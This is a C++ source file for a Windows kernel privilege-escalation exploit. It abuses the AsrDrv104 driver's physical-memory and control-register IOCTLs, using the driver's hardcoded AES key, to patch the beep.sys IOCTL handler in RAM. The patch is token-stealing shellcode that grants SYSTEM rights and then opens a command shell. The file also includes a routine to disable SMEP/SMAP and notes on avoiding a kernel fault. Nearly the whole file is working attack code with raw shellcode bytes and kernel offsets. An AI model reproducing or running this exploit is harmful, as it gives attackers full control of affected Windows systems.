#include <vector>
#include <Windows.h>
#include <winternl.h>
#include <conio.h>

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

#include <intrin.h>

#include "proto.h"

typedef uint64_t QWORD;

BYTE my_shellcode[0x1000];

void __declspec(noreturn) bye()
{
	printf("Press any key to exit\n");
	(void)_getwche();
	exit(0);
}

void hexdump(unsigned char* buf, size_t len)
{
	for (int i = 0; i < len; i++)
		printf("%02x ", buf[i]);
	printf("\n");
}



// struct stolen from https://githacks.org/_xeroxz/vdm/-/blob/master/VDM/util/util.hpp
#pragma pack (push, 1)
struct PhysicalMemoryPage//CM_PARTIAL_RESOURCE_DESCRIPTOR
{
	uint8_t type;
	uint8_t shareDisposition;
	uint16_t flags;
	uint64_t pBegin;
	uint32_t sizeButNotExactly;
	uint32_t pad;

	static constexpr uint16_t cm_resource_memory_large_40{ 0x200 };
	static constexpr uint16_t cm_resource_memory_large_48{ 0x400 };
	static constexpr uint16_t cm_resource_memory_large_64{ 0x800 };

	uint64_t size()const noexcept
	{
		if (flags & cm_resource_memory_large_40)
			return uint64_t{ sizeButNotExactly } << 8;
		else if (flags & cm_resource_memory_large_48)
			return uint64_t{ sizeButNotExactly } << 16;
		else if (flags & cm_resource_memory_large_64)
			return uint64_t{ sizeButNotExactly } << 32;
		else
			return uint64_t{ sizeButNotExactly };
	}

};
static_assert(sizeof(PhysicalMemoryPage) == 20, "PhysicalMemoryPage size wrong");
#pragma pack (pop)


struct physical_memory_layout_info_t {
	QWORD idk;
	QWORD idk2;
	ULONG count;
	PhysicalMemoryPage pmi[];
} *physical_memory_layout_info = NULL;

#pragma pack(push, 1)
struct ioctl_header
{
	WORD pad;
	DWORD iv_size;
	unsigned __int8 iv[21];
	unsigned __int8 key[16];
	unsigned __int8 pad2[3]; // alignment i guess
};

struct ioctl_footer
{
	DWORD cmd_size;
	WORD pad;
};
#pragma pack(pop)

size_t my_shellcode_data_sz = 0;
MyIrpStruct* my_shellcode_data = 0;

void PrepareIoctlData(void* cmd_in, size_t cmd_size, PVOID* pIoctl_data_out, size_t* buf_size_out)
{
	ioctl_header hdr;
	RtlZeroMemory(&hdr, sizeof(hdr));

	memset(hdr.iv, 0x69, sizeof(hdr.iv));
	memset(hdr.key, 0x69, sizeof(hdr.key));
	hdr.iv_size = sizeof(hdr.iv);

	//printf("input size is %zd\n", cmd_size);

	DWORD cbEncrypted;
	BYTE* my_cipher;
	{
		BCRYPT_ALG_HANDLE hAlgorithm;
		DWORD result = BCryptOpenAlgorithmProvider(&hAlgorithm, L"AES", 0i64, 0);// BCRYPT_AES_ALGORITHM
		//printf("BCryptOpenAlgorithmProvider -> %d\n", result);
		//printf("hAlgorithm = %p\n", hAlgorithm);

		BYTE enc_key[32];
		memset(enc_key, 0, sizeof(enc_key));
		memmove(enc_key, "C110DD4FE9434147B92A5A1E3FDBF29A", 32ui64);
		*(__m128i*)&enc_key[13] = _mm_loadu_si128((const __m128i*)hdr.key);

		HANDLE hKey;
		result = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, 0i64, 0, enc_key, 0x20u, 0);
		//printf("BCryptGenerateSymmetricKey -> %d\n", result);

		BYTE* ivCopy = (BYTE*) malloc(hdr.iv_size);
		memcpy(ivCopy, hdr.iv, hdr.iv_size);

		size_t cipher_buf_size = cmd_size + 64; // Lmao.
		my_cipher = (BYTE*) calloc(1, cipher_buf_size);

		result = BCryptEncrypt(hKey, (BYTE*)cmd_in, cmd_size, 0, ivCopy, hdr.iv_size, my_cipher, cipher_buf_size, &cbEncrypted, BCRYPT_BLOCK_PADDING);

		//printf("BCryptEncrypt -> %x\n", result);
		//printf("We encrypted %d bytes\n", cbEncrypted);
	}

	size_t buf_size = sizeof(ioctl_header) + cbEncrypted + sizeof(ioctl_footer);
	BYTE* buf = (BYTE*) calloc(1, buf_size);
	memcpy(buf, &hdr, sizeof(hdr));
	memcpy(buf + sizeof(hdr), my_cipher, cbEncrypted);
	ioctl_footer* footer = (ioctl_footer*)(buf + buf_size - sizeof(ioctl_footer));
	footer->cmd_size = cbEncrypted;

	*pIoctl_data_out = buf;
	*buf_size_out = buf_size;
}

#if 0
void Crypto_test()
{
	
	ioctl_header ioctl_crypto_params;
	memset(&ioctl_crypto_params, 0x41, sizeof(ioctl_crypto_params));
	BYTE* my_plain = (BYTE*)"ayylmao123456___";

	BYTE enc_key[32];
	memset(enc_key, 0, sizeof(enc_key));
	memmove(enc_key, "C110DD4FE9434147B92A5A1E3FDBF29A", 32ui64);
	*(__m128i*)& enc_key[13] = _mm_loadu_si128((const __m128i*) &ioctl_crypto_params.iv[21]);


	BYTE my_cipher[64];
	DWORD cbEncrypted;

	BYTE* pbIV = ioctl_crypto_params.iv;


	
	//for (int i = 0; i < cbEncrypted; i++)
	//	printf("%02x ", my_cipher[i]);
	//printf("\n");


	BCRYPT_ALG_HANDLE hAlgorithm;
	BCryptOpenAlgorithmProvider(&hAlgorithm, L"AES", 0i64, 0);// BCRYPT_AES_ALGORITHM
	printf("halg = %x\n", hAlgorithm);

	HANDLE hKey;
	BYTE* key = enc_key;
	DWORD result = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, 0i64, 0, key, 0x20u, 0);
	printf("BCryptGenerateSymmetricKey -> %d\n", result);

	BYTE* pbInput = my_cipher;
	DWORD cbInput = 32;
	DWORD cbOutput;
	result = BCryptDecrypt(hKey, pbInput, cbInput, 0i64, pbIV, cbInput, 0i64, 0, &cbOutput, BCRYPT_BLOCK_PADDING);
	printf("BCryptDecrypt 1 -> %d\n", result);
	printf("we want %d bytes\n", cbOutput);

	BYTE* pbOutput = (BYTE*)calloc(1, cbOutput);
	printf("buf = %p\n", pbOutput);

	DWORD cb_result;
	result = BCryptDecrypt(hKey, pbInput, cbInput, 0i64, pbIV, cbInput, (PUCHAR)pbOutput, cbOutput, &cb_result, BCRYPT_BLOCK_PADDING);
	printf("BCryptDecrypt 2 -> %x\n", result);

	printf("decrypted %d bytes\n", cb_result);

	for (int i = 0; i < cb_result; i++)
		printf("%02x ", pbOutput[i]);
	printf("\n");


	bye();
}
#endif

#pragma pack(push, 1)
union rweverything_args
{
	unsigned __int8 char_args[24];
	unsigned __int16 word_args[12];
	DWORD dword_args[6];
	uint64_t qword_args[3];
};

struct driver_cmd
{
	unsigned int opcode;
	int pad;
	rweverything_args args;
};
#pragma pack(pop)

HANDLE hDevice;
HANDLE hBeep;

BOOL DriverCall(DWORD opcode, rweverything_args* args, void** out, size_t* out_bytes)
{
	driver_cmd my_cmd;
	memset(&my_cmd, 0, sizeof(my_cmd));
	my_cmd.opcode = opcode;
	memcpy(&my_cmd.args, args, sizeof(rweverything_args));

	void* ioctl_data;
	size_t in_buf_size;
	PrepareIoctlData(&my_cmd, sizeof(my_cmd), &ioctl_data, &in_buf_size);

	//printf("input buf: %p\n", ioctl_data);
	//printf("input buf is %zx bytes\n", in_buf_size);

	DWORD bytes_returned = 0;

	BYTE out_buf[0x1000];
	memset(out_buf, 0x69, sizeof(out_buf));

	BOOL result = DeviceIoControl(hDevice, 0x22EC00, ioctl_data, in_buf_size, out_buf, sizeof(out_buf), &bytes_returned, NULL);
	//printf("result = %d\n", result);
	//printf("GetLastError = %x\n", GetLastError());
	//printf("bytes_returned = %x\n", bytes_returned);

	if (!result)
	{
		return result;
	}

	if (out)
	{
		*out = malloc(bytes_returned);
		if (out_bytes) *out_bytes = bytes_returned;
		memcpy(*out, out_buf, bytes_returned);
	}

	return result;
}

#define OPCODE_READ_CR 0x22E86C
#define OPCODE_WRITE_CR 0x22E870
#define OPCODE_READ_PHYSMEM 0x22E808
#define OPCODE_WRITE_PHYSMEM 0x22E80C

uint64_t ReadCrx(DWORD which)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.dword_args[0] = which;

	rweverything_args* out;
	DriverCall(OPCODE_READ_CR, &args, (void**)&out, NULL);

	uint64_t crX = out->qword_args[1];
	free(out);

	return crX;
}

void WriteCrx(DWORD which, uint64_t value)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.dword_args[0] = which;
	args.qword_args[1] = value;
	DriverCall(OPCODE_WRITE_CR, &args, NULL, NULL);
}

// bsods if you write to cr4
uint64_t DisableSmap()
{
	uint64_t cr4 = ReadCrx(4);
	printf("cr4 = %llx\n", cr4);

	uint64_t mask = (1 << 21) | (1 << 20); // SMAP and SMEP

	WriteCrx(4, cr4 & ~mask);
	//printf("smap + smep DISABLED!\n");

	return cr4; // return old value
}

BOOL ReadPhysical(uint64_t phys_addr, DWORD len, void* out_buf)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.qword_args[0] = phys_addr;
	args.dword_args[2] = len;
	args.dword_args[3] = 2; // granularity = DWORD
	args.qword_args[2] = (uint64_t)out_buf;
	return DriverCall(OPCODE_READ_PHYSMEM, &args, NULL, NULL);
}

BOOL WritePhysical(uint64_t phys_addr, DWORD len, void* in_buf)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.qword_args[0] = phys_addr;
	args.dword_args[2] = len;
	args.dword_args[3] = 0; // granularity = byte
	args.qword_args[2] = (uint64_t)in_buf;
	return DriverCall(OPCODE_WRITE_PHYSMEM, &args, NULL, NULL);
}

// page offset of our victim ioctl handler in beep.sys
QWORD ioctl_handler_pageOffset = 0x270;

BOOL found_ioctl = FALSE;

struct code_backup_t
{
	uint64_t phys_addr;
	BYTE page_contents[0x1000];
};

std::vector<code_backup_t> beepBackup;

void ScanPages(uint64_t start, uint64_t end)
{
	printf("Scanning memory at %p-%p\n", (void*)start, (void*)end);

	unsigned char beepPattern[53] = {
			0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00,
			0x00, 0x4C, 0x8B, 0xD2, 0x41, 0x8B, 0x40, 0x18, 0x2D, 0x00, 0x00, 0x01,
			0x00, 0x0F, 0x84, 0x63, 0x04, 0x00, 0x00, 0x83, 0xF8, 0x04, 0x0F, 0x85,
			0x4A, 0x04, 0x00, 0x00, 0x33, 0xC0, 0x41, 0x83, 0x78, 0x08, 0x08, 0x0F,
			0x82, 0x46, 0x04, 0x00, 0x00
	};

	size_t buf_size = 0x10000;
	size_t read_size = buf_size;
	BYTE* buf = (BYTE*)malloc(buf_size);
	if (!buf)
	{
		puts("Failed to allocate memory!");
		bye();
	}

	for (QWORD phys_addr = start; phys_addr < end;)
	{
		if (phys_addr % 0x100000 == 0)
		{
			printf("%p\r", (void*)phys_addr);
		}
		//printf("attempt to read phys mem at %p\n", (void*)phys_addr);
		BOOL success = ReadPhysical(phys_addr, read_size, buf);
		if (!success)
		{
			//printf("read at %p fails\r", (void*) phys_addr);
			if (read_size == buf_size)
			{
				read_size = 0x1000; // retry with one page
			}
			else if (read_size == 0x1000)
			{
				// even retrying with one page fails
				phys_addr += read_size;
				read_size = buf_size;
			}
			continue;
		}
		//printf("read %p success\n", (void*)phys_addr);
		for (int off = 0; off < read_size; off += 0x1000)
		{
			if (!memcmp(buf + off + ioctl_handler_pageOffset, beepPattern, sizeof(beepPattern)))
			{
				QWORD page_addr = phys_addr + off;
				QWORD beep_ioctl = page_addr + ioctl_handler_pageOffset;
				printf("\nFound beep.sys ioctl at %p\n", (void*)beep_ioctl);

				// back up the page contents (as we smash the original beep code, that will get called when our process closes beep handle).
				code_backup_t backup;
				backup.phys_addr = page_addr;
				memcpy(backup.page_contents, buf + off, 0x1000);
				beepBackup.emplace_back(backup);

				WritePhysical(beep_ioctl, 0x1000 - ioctl_handler_pageOffset, my_shellcode);
				found_ioctl = TRUE;
			}
		}
		phys_addr += read_size;
	}

	free(buf);
}

void ScanPhysical()
{
	Beep(440, 10);

	// 1. Scan physical memory for Beep.sys
	// 2. Overwrite the ioctl handler of Beep.sys in physical memory with our shellcode
	// 3. In shellcode we call ntoskrnl.exe!memcpy with controlled arguments (from IRP)
	// 4. Now we have arb write primitive
	// 5. then do the rest of the shit

	for (unsigned i = 0; i < physical_memory_layout_info->count; i++)
	{
		uint64_t start = physical_memory_layout_info->pmi[i].pBegin;
		uint64_t end = start + physical_memory_layout_info->pmi[i].size();
		ScanPages(start, end);
	}

	if (!found_ioctl)
	{
		printf("didn't find beep.sys\n");
		bye();
	}

	// lol xor eax,eax; mov cr3, rax
	//unsigned char shellcode[] = {
	//	0x31, 0xC0, 0x0F, 0x22, 0xD8,
	//};

	hexdump((BYTE*)my_shellcode_data, my_shellcode_data_sz);

	printf("ready kids?\n");

	fflush(stdout);
	_getwche();

	char out_buf[16]; // doesnt really matter
	DWORD bytes_returned;

	// get pointer to PsInitialSystemProcess and put in start of buffer (for priv escalation shellcode only)
	*(void**)my_shellcode_data = (void*)((uint64_t)my_shellcode_data->ntoskrnl + 0x4C52E0);

	BOOL result = DeviceIoControl(hBeep, 0x1234, my_shellcode_data, my_shellcode_data_sz, out_buf, sizeof(out_buf), &bytes_returned, NULL);
	printf("trigger DeviceIoControl returns %d\n", result);

	// restore smashed beep code
	for (int i = 0; i < beepBackup.size(); i++)
	{
		WritePhysical(beepBackup[i].phys_addr, 0x1000, beepBackup[i].page_contents);
		printf("restored code at %p\n", (void*)beepBackup[i].phys_addr);
	}

	/*
	avoiding fault in windbg:
	
	0: kd> u MiShowBadMapper L20
nt!MiShowBadMapper:
fffff801`0a141ac4 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff801`0a141ac9 48896c2418      mov     qword ptr [rsp+18h],rbp
fffff801`0a141ace 4889742420      mov     qword ptr [rsp+20h],rsi
fffff801`0a141ad3 57              push    rdi
fffff801`0a141ad4 4881ec90000000  sub     rsp,90h
fffff801`0a141adb 488b050e511600  mov     rax,qword ptr [nt!_security_cookie (fffff801`0a2a6bf0)]
fffff801`0a141ae2 4833c4          xor     rax,rsp
fffff801`0a141ae5 4889842480000000 mov     qword ptr [rsp+80h],rax
fffff801`0a141aed 8a1de7ad1900    mov     bl,byte ptr [nt!MiState+0x1eda (fffff801`0a2dc8da)]

	then write 2 to nt!MiState+0x1eda (fffff801`0a2dc8da
	eb  fffff801`0a2dc8da 2

	*/

	return;
}

void QueryPhysicalMemoryLayout()
{
	HKEY h_key;
	DWORD type, size = 0;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", 0, KEY_READ, &h_key);
	RegQueryValueEx(h_key, ".Translated", NULL, &type, NULL, &size); //get size
	if (!size)
	{
		printf("WTf can't open the key\n");
		bye();
	}
	BYTE* data = (BYTE*)malloc(size);
	RegQueryValueEx(h_key, ".Translated", NULL, &type, (BYTE*)data, &size);
	physical_memory_layout_info = (physical_memory_layout_info_t*)data;

	ULONG count = physical_memory_layout_info->count;
	if (!count)
	{
		printf("Query physical memory layout failed?\n");
		bye();
	}
	uint64_t total_pmem = 0;
	for (unsigned i = 0; i < count; i++)
	{
		uintptr_t end = physical_memory_layout_info->pmi[i].pBegin + physical_memory_layout_info->pmi[i].size();
		printf("%p - %p , type %02x , flags %04x , sharing %02x\n", (void*)physical_memory_layout_info->pmi[i].pBegin, (void*)end, physical_memory_layout_info->pmi[i].type, physical_memory_layout_info->pmi[i].flags, physical_memory_layout_info->pmi[i].shareDisposition);
		total_pmem += physical_memory_layout_info->pmi[i].size();
	}
	printf("you seem to have %.1f bytes physical memory mapped\n", (double)total_pmem/1e9);
}

void Get_kernel_offsets()
{
	typedef NTSTATUS (*NtQuerySystemInformation_t)(
			SYSTEM_INFORMATION_CLASS SystemInformationClass,
			PVOID SystemInformation,
			ULONG SystemInformationLength,
			PULONG ReturnLength);

	NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t) GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

	constexpr int SystemModuleInformation = 0xb;
	ULONG bytes = 0;
	NTSTATUS status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 0, bytes, &bytes);
	if (!bytes)
	{
		printf("NtQuerySystemInformation fails 1\n");
		bye();
	}

	typedef struct _SYSTEM_MODULE_ENTRY
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];

	} 	SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION
	{
		ULONG               	ModulesCount;
		SYSTEM_MODULE_ENTRY		Modules[0];

	} 	SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

	PSYSTEM_MODULE_INFORMATION pMods = (PSYSTEM_MODULE_INFORMATION)malloc(bytes);
	RtlZeroMemory(pMods, bytes);
	status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pMods, bytes, &bytes);
	if (status < 0)
	{
		puts("NtQuerySystemInformation fails 2");
		bye();
	}
	printf("there are %u modules\n", pMods->ModulesCount);

	uint64_t ntoskrnl_base = 0;

	for (unsigned i = 0; i < pMods->ModulesCount; i++)
	{
		if (!strcmp("\\SystemRoot\\system32\\ntoskrnl.exe", (const char*)pMods->Modules[i].FullPathName))
		{
			printf("Found ntoskrnl at %p\n", pMods->Modules[i].ImageBase);
			ntoskrnl_base = (uint64_t)pMods->Modules[i].ImageBase;
			break;
		}
	}

	if (!ntoskrnl_base)
	{
		printf("Can't find address of ntoskrnl.exe\n");
		bye();
	}

	printf("ntoskrnl at %p\n", ntoskrnl_base);

	HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNtoskrnl)
	{
		puts("failed to map ntoskrnl");
		bye();
	}

	my_shellcode_data->ntoskrnl = (void*)ntoskrnl_base;

	void* memcpy = (void*) GetProcAddress(hNtoskrnl, "memcpy");
	my_shellcode_data->nt_memcpy = (void (*)(void* dst, void* src, size_t len)) (ntoskrnl_base + (uint64_t)memcpy - (uint64_t)hNtoskrnl);
	printf("nt!memcpy at %p\n", my_shellcode_data->nt_memcpy);

	void* ExAllocatePoolWithTag = (void*)GetProcAddress(hNtoskrnl, "ExAllocatePoolWithTag");
	my_shellcode_data->nt_ExAllocatePoolWithTag = (void* (*)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag)) (ntoskrnl_base + (uint64_t)ExAllocatePoolWithTag - (uint64_t)hNtoskrnl);
	printf("nt!ExAllocatePoolWithTag at %p\n", my_shellcode_data->nt_ExAllocatePoolWithTag);

	void* PsCreateSystemThread = (void*)GetProcAddress(hNtoskrnl, "PsCreateSystemThread");
	my_shellcode_data->nt_PsCreateSystemThread = (NTSTATUS(*)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext)) (ntoskrnl_base + (uint64_t)PsCreateSystemThread - (uint64_t)hNtoskrnl);
	printf("nt!PsCreateSystemThread at %p\n", my_shellcode_data->nt_PsCreateSystemThread);

	void* IofCompleteRequest = (void*)GetProcAddress(hNtoskrnl, "IofCompleteRequest");
	my_shellcode_data->nt_IofCompleteRequest = (void*) (ntoskrnl_base + (uint64_t)IofCompleteRequest - (uint64_t)hNtoskrnl);
	printf("nt!IofCompleteRequest at %p\n", my_shellcode_data->nt_IofCompleteRequest);

	FreeLibrary(hNtoskrnl);
}

void Get_shellcode()
{
	// Shellcode for privilege escalation
	CONST BYTE ShellcodeBytes[] =
		"\x48\x8B\x4A\x18" // mov rcx, [rdx + _IRP.SystemBuffer]
		"\x48\x8B\x09" // mov rcx, [rcx] -- now points to nt!PsInitialSystemProcess (which is a pointer to eprocess)
		// The shellcode takes the address of a pointer to a process object in the kernel in the first
		// argument (RCX), and copies its security token to the current process.
		//
		// 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
		// -00
		// 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
		// 00000010  488B09            mov rcx, [rcx]
		// 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
		// 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
		// 00000021  C3                ret
		"\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00"
		"\x48\x8B\x09\x48\x8B\x89\x58\x03\x00\x00\x48\x89\x88\x58\x03\x00"
		"\x00\xC3";

	memset(my_shellcode, 0, sizeof(my_shellcode));
	memcpy(my_shellcode, ShellcodeBytes, sizeof(ShellcodeBytes));
	hexdump(my_shellcode, 0x1000);
	return;

	// Shellcode to allocate-copy-startthread shellcode
	HMODULE my_driver = LoadLibraryExA("MyDriver1.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
	printf("my_driver at %p\n", my_driver);
	if (!my_driver)
	{
		printf("failed to map MyDriver1.sys\n");
		bye();
	}
	void* shellcode = (void*) GetProcAddress(my_driver, "MyIRPHandler");
	printf("shellcode at %p\n", shellcode);
	memcpy(my_shellcode, shellcode, 0x1000);
	FreeLibrary(my_driver);
	//hexdump(my_shellcode, 0x1000);
}

void Setup_payload()
{
	char payload[] = { 0xc3 };
	size_t payload_sz = sizeof(payload);
	my_shellcode_data_sz = sizeof(MyIrpStruct) + payload_sz;
	my_shellcode_data = (MyIrpStruct*)malloc(my_shellcode_data_sz);
	if (!my_shellcode_data)
	{
		printf("malloc fails\n");
		bye();
	}
	memcpy(my_shellcode_data->payload, payload, payload_sz);
	my_shellcode_data->payload_size = payload_sz;
	printf("fake irp handler data block size = %llx\n", my_shellcode_data_sz);
}

int main()
{
	Setup_payload();
	Get_kernel_offsets();
	Get_shellcode();

	//if (!memcpy_off)
	//{
	//	puts("failed to grab kernel offsets");
	//	bye();
	//}

	QueryPhysicalMemoryLayout();
	//bye();

	//Crypto_test();

	hBeep = CreateFileA("\\\\.\\GlobalRoot\\Device\\Beep", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	printf("hBeep = %p\n", hBeep);

	if (hBeep == INVALID_HANDLE_VALUE)
	{
		printf("GLE = %x\n", GetLastError());
		bye();
	}

	hDevice = CreateFileA("\\\\.\\GlobalRoot\\Device\\AsrDrv104", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	printf("hDevice = %p\n", hDevice);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("GLE = %x\n", GetLastError());
		bye();
	}

	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.dword_args[0] = 3; // cr3
	args.qword_args[1] = 0; // lol cr3 <- NULL

	rweverything_args* out;
	DriverCall(OPCODE_READ_CR, &args, (void**) &out, NULL);

	ScanPhysical();

	system("cmd");

	bye();
}
